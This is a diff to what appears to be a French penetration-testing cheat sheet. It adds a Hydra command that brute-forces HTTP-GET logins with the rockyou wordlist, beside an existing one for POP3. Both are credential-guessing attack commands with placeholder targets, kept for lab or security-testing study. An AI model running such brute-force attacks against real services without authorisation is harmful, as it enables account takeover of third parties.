@@ -36,6 +36,12 @@ ou
 hydra -l <user>  -P /usr/share/wordlists/fasttrack.txt pop3://$IP -s <port> -t 64 
 ```
 
+* Hydra pour http-get
+
+```
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt $IP -s <port> http-get
+```
+
 ## Transfert de fichiers
 
 Pour transférer des fichiers depuis la machine Kali vers la machine cible:
